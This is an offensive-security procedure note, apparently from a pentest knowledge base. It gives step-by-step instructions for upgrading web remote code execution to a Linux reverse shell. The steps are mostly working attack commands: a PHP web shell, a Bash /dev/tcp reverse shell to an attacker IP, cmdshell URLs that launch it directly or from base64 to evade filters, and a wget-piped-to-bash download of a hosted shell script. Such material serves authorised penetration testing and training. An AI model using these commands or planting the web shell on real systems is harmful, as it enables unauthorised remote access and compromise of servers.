---
id: 21c10b4b-9ef8-46ab-aaee-cf316b597e74
name: Upgrade from a Website RCE to Reverse Shell (Linux)
type: procedure
verified: false
submitted: false
created_at: '2019-12-05T01:41:02.612510+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Web Shell|T1100 - Web Shell]]'
platforms:
- Web
tags:
- '[[RCE]]'
- '[[Web Applications]]'
commands:
- '[[Base 64 Encode a Command]]'
- '[[Launch a Python 3 Web Server]]'
---

# Upgrade from a Website RCE to Reverse Shell (Linux)

## Summary

In cases where Remote Code Execution (RCE) is achieved on a web application, the next step is usually to launch a reverse shell for terminal access. This procedure will outline a few common approaches. 

## Description

# Description

In cases where Remote Code Execution (RCE) is achieved on a web application, the next step is usually to launch a reverse shell for terminal access. This procedure will outline a few common approaches.

# Instructions

This procedure will assume remote code execution is being done with a PHP cmdshell, but the concepts are generic and can apply to many situations. In this case, the following PHP code has been added to a web page.

**Code**: [[<?php system($_REQUEST["cmd"]); ?>]]

It is executed by browsing to the page's URL and supplying the "cmd" argument, along with a value. 

For example:

http://example.com/cmdshell.php?cmd=whoami

When choosing a reverse shell, software installed on the target system should be considered. A very helpful resource is pentestmonkey's Reverse Shell Cheat Sheet:

[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

Each example will use a simple Bash 4 reverse shell, connecting back to 10.10.10.100 on port 443:

**Code**: [[bash -i >& /dev/tcp/10.10.10.100/443 0>&1]]

## Executing a Reverse Shell Directly from RCE

A basic reverse shell can often be executed straight from a cmdshell using a browser's address bar.

URL: [http://example.com/cmdshell.php?cm=bash+-i+>%26+/dev/tcp/10.10.10.100/443+0>%261](http://example.com/cmdshell.php?cm=bash+-i+>%26+/dev/tcp/10.10.10.100/443+0>%261)

Browsers automatically URL encode data submitted via the address bar. If using a tool such as curl to send the same command, the command must be encoded, or curl must be explicitly told to URL encode the data.

## Executing a Base 64 Encoded Reverse Shell from RCE

In many cases, commands executed via RCE will filter out certain characters, sometimes due to a blacklist/whitelist, and sometimes due to a quirk of the RCE. Since ASCII characters are often allowed, one workaround may be to Base64 encode a command, then decode the command and execute it using the RCE.

**Command** ([[Base 64 Encode a Command]]):

```bash
echo -n "$_COMMAND" | base64 -w 0
```

The encoded command can be executed using echo to print the command, then pipe it to a Base64 decode statement, then execute the result.

URL:  [http://example.com/cmdshell.php?cmd=echo+-n+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xMC4xMDAvNDQzIDA%2bJjE%3d|base64+-d|bash](http://example.com/cmdshell.php?cmd=echo+-n+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xMC4xMDAvNDQzIDA%2bJjE%3d|base64+-d|bash)

## Download and Execute a Reverse Shell

Often the most consistent method of executing a shell is to download the shell to the target, then execute it, bypassing many common filters which impede execution.

Write the Bash reverse shell to a file, then host it on a web server.

**Command** ([[Launch a Python 3 Web Server]]):

```bash
python3 -m http.server $_PORT
```

Download and execute the shell with the cmdshell:

[http://example.com/cmdshell.php?cmd=wget+10.10.10.100/revshell.sh+-O+-|bash](http://example.com/cmdshell.php?cmd=wget+10.10.10.100/revshell.sh+-O+-|bash)

## Platforms

- Web

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Web Shell|T1100 - Web Shell]]

## Commands Used

- [[Base 64 Encode a Command]]
- [[Launch a Python 3 Web Server]]

## Tags

- [[RCE]]
- [[Web Applications]]
